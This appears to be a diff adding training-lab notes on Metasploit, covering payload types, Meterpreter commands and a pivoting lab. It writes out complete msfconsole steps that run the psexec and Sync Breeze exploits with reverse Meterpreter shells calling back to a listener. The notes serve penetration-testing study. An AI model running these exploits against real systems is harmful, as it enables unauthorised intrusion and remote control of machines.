@@ -1,0 +1,58 @@
+== Metasploit an Introduction ==
+
+*Includes:*
+
+    * Exploits
+    * Payloads: stages and stagers
+    * Documentation
+    * Tools for exploit creation
+    * Multiple user interfaces
+
+*Stagers:* Establish communication channel with target
+*Stages:* Leverage communication channle to perform some action (usually start a shell listener, push a shell back to listener, and so on)
+*Singles:* Stage and stager combined
+
+*Metasploit: Running an Exploit*
+
+    * Start the MSF Console: `msfconsole -q`
+    * Select an exploit: `use exploit/windows/smb/psexec_ps`
+    * Select payload: `set PAYLOAD windows/meterpreter/reverse_https`
+    * Set options: 
+      `show options`
+      `set SMBUser REM`
+      `set SMBPass malware`
+      `set SHARE C`
+      `set LPORT 443`
+      `set LHOST 192.168.87.139`
+    * Run exploit: `exploit`
+
+*Meterpreter: A custom Metasploit shell environment*
+*Commands:*
+
+    * `sysinfo`: System info
+    * `pwd`: Present working directory
+    * `ps`: Process status
+    * `getuid`: Current UID of user context for Metasploit
+    * `getpid`: Current PID of the process Metasploit is inside
+    * `migrate`: Move to a different process
+    * `execute`: Run a program
+    * `kill`: Stop a process
+    * `edit`: Editor similar to vi
+
+== Lab 2.4: Metasploit + Pivoting ==
+
+*Task 1: Setup the Pivot*
+
+    * List Metasploit active sessions: `sessions -l`
+    * Kill existing sessions: `sessions -k <session number>`
+    * Sync Breeze exploit: 
+      `msfconsole`
+      `use exploit/windows/http/syncbreeze_bof`
+      `set payload windows/meterpreter/reverse_tcp`
+    * Exploit parameters: 
+      `set rhost 10.10.10.2`
+      `set lhost 10.10.10.4`
+      `set lport 3333`
+    * Run exploit: `exploit`
+
+
